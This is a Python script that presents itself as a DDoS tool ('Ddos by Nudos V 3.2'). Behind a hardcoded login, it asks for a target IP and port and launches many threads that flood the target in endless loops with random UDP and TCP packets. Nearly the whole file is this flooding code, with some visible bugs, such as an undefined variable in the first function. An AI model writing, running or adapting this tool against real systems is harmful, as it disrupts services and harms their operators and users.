import random
import socket
import time
import os,sys
import threading
import colorama
from colorama import Fore, Back, Style
colorama.init()

print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

attemps = 0

while attemps < 150:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'nudos' and password == 'nudos':
        print('You have successfully logged in.')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

print("")
print("")
print(Fore.GREEN +"                       [-] START [-]\n")
print(Fore.YELLOW +"                       Ddos by Nudos\n")
print(Fore.RED +"                       ╔╗╔╦ ╦╔╦╗╔═╗╔═╗")
print(Fore.RED +"                       ║║║║ ║ ║║║ ║╚═╗")
print(Fore.RED +"                       ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 3.2")
print(Fore.BLUE +"                        Code By Mika")

ip = str(input(Fore.GREEN +"IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("continue?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("THREADS:"))
def run():
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run8():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run12():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run14():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Nudos-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
else:
        th = threading.Thread(target = run14)
        th.start()
